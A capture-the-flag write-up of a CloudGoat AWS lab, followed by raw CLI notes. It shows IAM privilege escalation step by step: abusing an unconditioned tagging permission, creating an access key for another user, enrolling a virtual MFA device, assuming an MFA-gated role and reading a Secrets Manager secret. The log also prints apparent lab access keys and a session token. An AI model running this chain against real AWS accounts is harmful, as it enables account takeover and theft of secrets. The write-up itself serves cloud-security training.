# Writeup Rotation Lab

---

## 1. Context

CloudGoat lab simulating an AWS environment vulnerable to IAM privilege escalation through a combination of tagging, access key rotation, and MFA-protected role assumption. Objective: escalate from a limited manager account to a secrets-manager role and retrieve the final flag.

---

## 2. Reconnaissance — Initial Account

### 2.1 Identity: `manager_lab`

```bash
aws sts get-caller-identity --profile rota
```

**Result:**
```json
{
  "UserId": "AIDA5Y6JLPXSWDRNJ3FHH",
  "Account": "946925698533",
  "Arn": "arn:aws:iam::946925698533:user/manager_lab"
}
```

### 2.2 Attached Policies

```bash
aws iam list-attached-user-policies --user-name manager_lab --profile rota
```

**Result:**
- `IAMReadOnlyAccess` (AWS managed)

### 2.3 Inline Policies

```bash
aws iam list-user-policies --user-name manager_lab --profile rota
```

**Result:**
- `SelfManageAccess`
- `TagResources`

---

## 3. Policy Analysis

### 3.1 SelfManageAccess

```bash
aws iam get-user-policy --user-name manager_lab --policy-name SelfManageAccess --profile rota
```

**Key permissions:**
- `iam:CreateAccessKey`
- `iam:DeleteAccessKey`
- `iam:UpdateAccessKey`
- `iam:EnableMFADevice`
- `iam:DeactivateMFADevice`
- `iam:ResyncMFADevice`
- `iam:GetMFADevice`

**Condition:**
```json
"Condition": {
  "StringEquals": {
    "aws:ResourceTag/developer": "true"
  }
}
```

**Impact:** Can create access keys **only** for users tagged `developer=true`.

### 3.2 TagResources

```bash
aws iam get-user-policy --user-name manager_lab --policy-name TagResources --profile rota
```

**Permissions:**
- `iam:TagUser`
- `iam:UntagUser`
- `iam:TagRole`
- `iam:UntagRole`
- `iam:TagPolicy`
- `iam:UntagPolicy`
- `iam:TagMFADevice`
- `iam:UntagMFADevice`

**Impact:** Can tag **any** IAM resource, with **no conditions**.

---

## 4. Privilege Escalation — Tag & Key Rotation

### 4.1 Enumerate Users

```bash
aws iam list-users --profile rota
```

**Users discovered:**
- `admin_lab`
- `developer_lab`
- `manager_lab`

### 4.2 Tag the Admin User

Bypass the `developer=true` condition by tagging `admin_lab`:

```bash
aws iam tag-user --user-name admin_lab --tags Key=developer,Value=true --profile rota
```

### 4.3 Check Existing Access Keys

```bash
aws iam list-access-keys --user-name admin_lab --profile rota
```

**Result:** 2 inactive access keys (limit reached).

### 4.4 Delete an Inactive Key

```bash
aws iam delete-access-key   --user-name admin_lab   --access-key-id AKIA5Y6JLPXS6HAVVM6T   --profile rota
```

### 4.5 Create a New Access Key

```bash
aws iam create-access-key --user-name admin_lab --profile rota
```

**Result:**
```json
{
  "AccessKey": {
    "UserName": "admin_lab",
    "AccessKeyId": "AKIA5Y6JLPXSZ7ZS7N4Y",
    "Status": "Active",
    "SecretAccessKey": "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"
  }
}
```

**→ Pivot to `admin_lab` credentials.**

---

## 5. Reconnaissance as `admin_lab`

### 5.1 Identity Verification

```bash
aws sts get-caller-identity --profile rota2
```

**Result:**
```json
{
  "UserId": "AIDA5Y6JLPXSU56PTOYO7",
  "Account": "946925698533",
  "Arn": "arn:aws:iam::946925698533:user/admin_lab"
}
```

### 5.2 Policies

```bash
aws iam list-attached-user-policies --user-name admin_lab --profile rota2
aws iam list-user-policies --user-name admin_lab --profile rota2
```

**Result:**
- Attached: `IAMReadOnlyAccess`
- Inline: `AssumeRoles`

### 5.3 Role Enumeration

```bash
aws iam list-roles --profile rota2
```

**Target role discovered:**

| Attribute | Value |
|-----------|-------|
| Role Name | `cg_secretsmanager_lab` |
| Trust Policy | `arn:aws:iam::946925698533:root` |
| Condition | `aws:MultiFactorAuthPresent: true` |

**Impact:** The role requires MFA to be assumed.

---

## 6. MFA Bypass — Create & Enable Virtual MFA

### 6.1 Create Virtual MFA Device

Using `manager_lab` permissions (still valid):

```bash
aws iam create-virtual-mfa-device   --virtual-mfa-device-name mon_mfa   --outfile /tmp/mfa.png   --bootstrap-method QRCodePNG   --profile rota
```

**Result:**
```json
{
  "VirtualMFADevice": {
    "SerialNumber": "arn:aws:iam::946925698533:mfa/mon_mfa"
  }
}
```

### 6.2 Enable MFA on `admin_lab`

Using two consecutive TOTP codes from the QR code:

```bash
aws iam enable-mfa-device   --user-name admin_lab   --serial-number arn:aws:iam::946925698533:mfa/mon_mfa   --authentication-code1 458072   --authentication-code2 000208   --profile rota
```

**→ `admin_lab` now has MFA enabled.**

---

## 7. Role Assumption — `cg_secretsmanager_lab`

### 7.1 Assume Role with MFA

```bash
aws sts assume-role   --role-arn arn:aws:iam::946925698533:role/cg_secretsmanager_lab   --role-session-name final-session   --serial-number arn:aws:iam::946925698533:mfa/mon_mfa   --token-code 159610   --profile rota2
```

**Result:**
```json
{
  "Credentials": {
    "AccessKeyId": "ASIA5Y6JLPXS724NZ7WL",
    "SecretAccessKey": "mK/C4zJT4KlG//aMUtXZIfDxO63XJkvrs+9aFee8",
    "SessionToken": "IQoJb3JpZ2luX2VjEMX...",
    "Expiration": "2026-08-09T21:54:35Z"
  },
  "AssumedRoleUser": {
    "AssumedRoleId": "AROA5Y6JLPXSXN3NKZWW3:final-session",
    "Arn": "arn:aws:sts::946925698533:assumed-role/cg_secretsmanager_lab/final-session"
  }
}
```

**→ Pivot to `cg_secretsmanager_lab` role.**

---

## 8. Flag Retrieval

### 8.1 Identity Verification

```bash
aws sts get-caller-identity --profile rota3
```

**Result:**
```json
{
  "UserId": "AROA5Y6JLPXSXN3NKZWW3:final-session",
  "Account": "946925698533",
  "Arn": "arn:aws:sts::946925698533:assumed-role/cg_secretsmanager_lab/final-session"
}
```

### 8.2 List Secrets

```bash
aws secretsmanager list-secrets --profile rota3
```

**Result:**
```json
{
  "SecretList": [
    {
      "ARN": "arn:aws:secretsmanager:us-east-1:946925698533:secret:cg_secret_lab-FjtC5U",
      "Name": "cg_secret_lab",
      "Description": "The primary secret for the iam_privesc_by_key_rotation scenario"
    }
  ]
}
```

### 8.3 Extract Flag

```bash
aws secretsmanager get-secret-value   --secret-id arn:aws:secretsmanager:us-east-1:946925698533:secret:cg_secret_lab-FjtC5U   --profile rota3
```

**Flag:**
```json
{
  "Name": "cg_secret_lab",
  "SecretString": "HSM{14m..............4R}"
}
```

---

## 9. Kill Chain Summary

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  manager_lab                                                                │
│  └─ iam:TagUser ──► Tag admin_lab with developer=true                      │
│                                                                             │
│  manager_lab                                                                │
│  └─ iam:CreateAccessKey (condition satisfied) ──► New key for admin_lab    │
│                                                                             │
│  admin_lab                                                                  │
│  └─ iam:CreateVirtualMFADevice + iam:EnableMFADevice                       │
│                                                                             │
│  admin_lab + MFA                                                            │
│  └─ sts:AssumeRole ──► cg_secretsmanager_lab (MFA condition passed)        │
│                                                                             │
│  cg_secretsmanager_lab                                                      │
│  └─ secretsmanager:ListSecrets + GetSecretValue                             │
│                                                                             │
│  🏴 FLAG: HSM{14m..................5C4R}                                    │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 10. Key Attack Vectors

| Step | Technique | Impact |
|------|-----------|--------|
| **Tag abuse** | `iam:TagUser` without conditions | Bypass resource-level conditions on other policies |
| **Key rotation** | `iam:CreateAccessKey` on another user | Account takeover via new long-term credentials |
| **MFA enrollment** | `iam:CreateVirtualMFADevice` + `EnableMFADevice` | Satisfy MFA condition for role assumption |
| **Role assumption** | `sts:AssumeRole` with MFA token | Escalate to privileged role |
| **Data exfiltration** | `secretsmanager:GetSecretValue` | Flag retrieval |

---


































_____________________________________________________
# Rotation

account id : 946925698533


aws sts get-caller-identity --profile rota                                                                        
{
    "UserId": "AIDA5Y6JLPXSWDRNJ3FHH",
    "Account": "946925698533",
    "Arn": "arn:aws:iam::946925698533:user/manager_lab"
}


aws iam list-attached-user-policies --user-name manager_lab --profile rota
{
    "AttachedPolicies": [
        {
            "PolicyName": "IAMReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess"
        }
    ]
}






aws iam list-policy-versions --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess --profile rota
{
    "Versions": [
        {
            "VersionId": "v4",
            "IsDefaultVersion": true,
            "CreateDate": "2018-01-25T19:11:27+00:00"
        },
        {
            "VersionId": "v3",
            "IsDefaultVersion": false,
            "CreateDate": "2016-09-06T17:06:37+00:00"
        },
        {
            "VersionId": "v2",
            "IsDefaultVersion": false,
            "CreateDate": "2015-04-21T16:01:34+00:00"
        },
        {
            "VersionId": "v1",
            "IsDefaultVersion": false,
            "CreateDate": "2015-02-06T18:40:39+00:00"
        }
    ]
}





aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess --version-id v1 --profile rota
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:List*",
                        "iam:Get*"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2015-02-06T18:40:39+00:00"
    }
}



*ws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess --version-id v2 --profile rota
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GenerateCredentialReport",
                        "iam:Get*",
                        "iam:List*"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": false,
        "CreateDate": "2015-04-21T16:01:34+00:00"
    }
}



aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess --version-id v3 --profile rota
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GenerateCredentialReport",
                        "iam:GenerateServiceLastAccessedDetails",
                        "iam:Get*",
                        "iam:List*"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v3",
        "IsDefaultVersion": false,
        "CreateDate": "2016-09-06T17:06:37+00:00"
    }
}




aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess --version-id v4 --profile rota
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GenerateCredentialReport",
                        "iam:GenerateServiceLastAccessedDetails",
                        "iam:Get*",
                        "iam:List*",
                        "iam:SimulateCustomPolicy",
                        "iam:SimulatePrincipalPolicy"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2018-01-25T19:11:27+00:00"
    }
}







aws iam list-user-policies --user-name manager_lab --profile rota
{
    "PolicyNames": [
        "SelfManageAccess",
        "TagResources"
    ]
}



aws iam get-user-policy --user-name manager_lab --policy-name SelfManageAccess --profile rota
{
    "UserName": "manager_lab",
    "PolicyName": "SelfManageAccess",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:DeactivateMFADevice",
                    "iam:GetMFADevice",
                    "iam:EnableMFADevice",
                    "iam:ResyncMFADevice",
                    "iam:DeleteAccessKey",
                    "iam:UpdateAccessKey",
                    "iam:CreateAccessKey"
                ],
                "Condition": {
                    "StringEquals": {
                        "aws:ResourceTag/developer": "true"
                    }
                },
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:iam::946925698533:user/*",
                    "arn:aws:iam::946925698533:mfa/*"
                ],
                "Sid": "SelfManageAccess"
            },
            {
                "Action": [
                    "iam:DeleteVirtualMFADevice",
                    "iam:CreateVirtualMFADevice"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:iam::946925698533:mfa/*",
                "Sid": "CreateMFA"
            }
        ]
    }
}

>>>>>>>>>>>>>>>>>  
"iam:CreateAccessKey"
     "Condition": {
              "aws:ResourceTag/developer": "true"

aws iam get-user-policy --user-name manager_lab --policy-name TagResources --profile rota
{
    "UserName": "manager_lab",
    "PolicyName": "TagResources",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:UntagUser",
                    "iam:UntagRole",
                    "iam:TagRole",
                    "iam:UntagMFADevice",
                    "iam:UntagPolicy",
                    "iam:TagMFADevice",
                    "iam:TagPolicy",
                    "iam:TagUser"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "TagResources"
            }
        ]
    }






PACU : 
"Permissions": {
    "Allow": [
      "iam:GetAccountAuthorizationDetails",
      "iam:GetUser",
      "iam:ListAttachedUserPolicies",
      "iam:ListUserPolicies",
      "iam:ListGroupsForUser",
      "iam:ListAccessKeys",
      "iam:GetAccountSummary",
      "iam:GetAccountAuthorizationDetails",
      "iam:ListVirtualMfaDevices",
      "iam:ListGroups",
      "iam:ListRoles",
      "iam:ListUsers",
      "iam:ListServiceSpecificCredentials",
      "iam:ListSigningCertificates",
      "iam:ListServerCertificates",
      "iam:GetUser",
      "iam:ListInstanceProfiles",
      "iam:ListMfaDevices",
      "iam:ListSshPublicKeys",
      "iam:ListSamlProviders",
      "iam:ListPolicies",
      "iam:ListAccountAliases",
      "iam:ListOpenIdConnectProviders",
      "dynamodb:DescribeEndpoints",
      "sts:GetCallerIdentity",
      "sts:GetSessionToken"
    ],
    "Deny": [
      "iam:ListGroupPolicies"
    ]
  }









aws iam list-users --profile rota
{
    "Users": [
        {
            "Path": "/",
            "UserName": "admin_lab",
            "UserId": "AIDA5Y6JLPXSU56PTOYO7",
            "Arn": "arn:aws:iam::946925698533:user/admin_lab",
            "CreateDate": "2026-08-09T20:07:43+00:00"
        },
        {
            "Path": "/",
            "UserName": "developer_lab",
            "UserId": "AIDA5Y6JLPXSUAC2BHGWU",
            "Arn": "arn:aws:iam::946925698533:user/developer_lab",
            "CreateDate": "2026-08-09T20:07:43+00:00"
        },
        {
            "Path": "/",
            "UserName": "manager_lab",
            "UserId": "AIDA5Y6JLPXSWDRNJ3FHH",
            "Arn": "arn:aws:iam::946925698533:user/manager_lab",
            "CreateDate": "2026-08-09T20:07:43+00:00"
        }
    ]
}
                               



aws iam tag-user --user-name admin_lab --tags Key=developer,Value=true --profile rota



aws iam create-access-key --user-name admin_lab --profile rota

aws: [ERROR]: An error occurred (LimitExceeded) when calling the CreateAccessKey operation: Cannot exceed quota for AccessKeysPerUser: 2




aws iam list-access-keys --user-name admin_lab --profile rota
{
    "AccessKeyMetadata": [
        {
            "UserName": "admin_lab",
            "AccessKeyId": "AKIA5Y6JLPXS6HAVVM6T",
            "Status": "Inactive",
            "CreateDate": "2026-08-09T20:07:43+00:00"
        },
        {
            "UserName": "admin_lab",
            "AccessKeyId": "AKIA5Y6JLPXS6VJMHPVW",
            "Status": "Inactive",
            "CreateDate": "2026-08-09T20:07:43+00:00"
        }
    ]
}



aws iam delete-access-key --user-name admin_lab --access-key-id AKIA5Y6JLPXS6HAVVM6T --profile rota





aws iam create-access-key --user-name admin_lab --profile rota                                     
{
    "AccessKey": {
        "UserName": "admin_lab",
        "AccessKeyId": "AKIA5Y6JLPXSZ7ZS7N4Y",
        "Status": "Active",
        "SecretAccessKey": "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",
        "CreateDate": "2026-08-09T20:26:39+00:00"
    }
}




aws sts get-caller-identity --profile rota2
{
    "UserId": "AIDA5Y6JLPXSU56PTOYO7",
    "Account": "946925698533",
    "Arn": "arn:aws:iam::946925698533:user/admin_lab"
}

aws iam list-attached-user-policies --user-name admin_lab --profile rota2
{
    "AttachedPolicies": [
        {
            "PolicyName": "IAMReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess"
        }
    ]
}


aws iam list-user-policies --user-name admin_lab --profile rota2
{
    "PolicyNames": [
        "AssumeRoles"
    ]
}


aws iam list-roles --profile rota2
{
    "Roles": [
        
        {
            "Path": "/",
            "RoleName": "cg_secretsmanager_lab",
            "RoleId": "AROA5Y6JLPXSXN3NKZWW3",
            "Arn": "arn:aws:iam::946925698533:role/cg_secretsmanager_lab",
            "CreateDate": "2026-08-09T20:07:44+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::946925698533:root"
                        },
                        "Action": "sts:AssumeRole",
                        "Condition": {
                            "Bool": {
                                "aws:MultiFactorAuthPresent": "true"
                            }
                        }
 


aws iam create-virtual-mfa-device --virtual-mfa-device-name mon_mfa --outfile /tmp/mfa.png --bootstrap-method QRCodePNG --profile rota

{
    "VirtualMFADevice": {
        "SerialNumber": "arn:aws:iam::946925698533:mfa/mon_mfa"
    }
}


aws iam enable-mfa-device \
  --user-name admin_lab \
  --serial-number arn:aws:iam::946925698533:mfa/mon_mfa \
  --authentication-code1 458072 \
  --authentication-code2 000208 \
  --profile rota 



aws sts assume-role \      
  --role-arn arn:aws:iam::946925698533:role/cg_secretsmanager_lab \
  --role-session-name final-session \                    
  --serial-number arn:aws:iam::946925698533:mfa/mon_mfa \
  --token-code 159610 \          
  --profile rota2
{
    "Credentials": {
        "AccessKeyId": "ASIA5Y6JLPXS724NZ7WL",
        "SecretAccessKey": "mK/C4zJT4KlG//aMUtXZIfDxO63XJkvrs+9aFee8",
        "SessionToken": "IQoJb3JpZ2luX2VjEMX//////////wEaCXVzLWVhc3QtMSJHMEUCIFpDPEFo4XY6p+dd99TAgH9ybjL3N+YJ0TF21IM9JE44AiEA6UMdzt0eLxlgfszjsy+WKRCj7/cD3V/H1Xb/zLg8ZKgqowIIjv//////////ARAAGgw5NDY5MjU2OTg1MzMiDGugZ90e4z6oOc7DOir3ATaOnroFdzW1am81VK0qmKuT1hDd/jMprTZpKy0fjxQ5U6wvMIxeLUTpZJgu3aK91dvp1/XUEgvi0ikUhUcZ4GkhtWYOpYiOCYgjhrfSRqNilSp10GTMfnz7A5ZPPRanHHPoVExaU88Blk92dDlTBwKvDsndBTGRNRPtFOZkeNHrivyqiqduWba9rFVttKRuJKcSiBLtelSyzHJo05KJOAZIHGxEZ70HE53+c6I698pJNyPctmiAaG6mqS7tr2me6oD3PyUPEfe+N6BL8U9egL/Kk/EWzO2f1om6uXa2jIsPMjEviX5WxMNaDSgp405yBRbvQUeWuo4wi9Lj0wY6nQFGK8KpISCAl4BWKRSf8dtKNP9xvhSLEjpJxo+m2N5VpXbhWy266hPSot3wL808QvQDa37WKk2xYOYgZiqXjB3PE5UAQhI2KfjGHNhB4M3OVcoIV2HJUYlSY78ZKOIyrJkGwUgR+/dxkBMwZ0Fwxxw+KG3swGQj1Z9hqe6kL1xE1xDawzWUO1XHS4hbsoSwBWcgC6v/qLbM0pIc2hVN",
        "Expiration": "2026-08-09T21:54:35+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA5Y6JLPXSXN3NKZWW3:final-session",
        "Arn": "arn:aws:sts::946925698533:assumed-role/cg_secretsmanager_lab/final-session"
    }
}



aws sts get-caller-identity --profile rota3
{
    "UserId": "AROA5Y6JLPXSXN3NKZWW3:final-session",
    "Account": "946925698533",
    "Arn": "arn:aws:sts::946925698533:assumed-role/cg_secretsmanager_lab/final-session"
}



aws secretsmanager list-secrets --profile rota3                   
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:946925698533:secret:cg_secret_lab-FjtC5U",
            "Name": "cg_secret_lab",
            "Description": "The primary secret for the iam_privesc_by_key_rotation scenario",
            "LastChangedDate": "2026-08-09T16:07:44.006000-04:00",
            "LastAccessedDate": "2026-08-08T20:00:00-04:00",
            "SecretVersionsToStages": {
                "terraform-SBlpu25S8dRJbpLif2AQQsDocN": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2026-08-09T16:07:43.824000-04:00"
        }
    ]
}



aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-east-1:946925698533:secret:cg_secret_lab-FjtC5U --profile rota3
{
    "ARN": "arn:aws:secretsmanager:us-east-1:946925698533:secret:cg_secret_lab-FjtC5U",
    "Name": "cg_secret_lab",
    "VersionId": "terraform-SBlpu25S8dRJbpLif2AQQsDocN",
    "SecretString": "HSM{14m..................5C4R}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2026-08-09T16:07:44.003000-04:00"
}










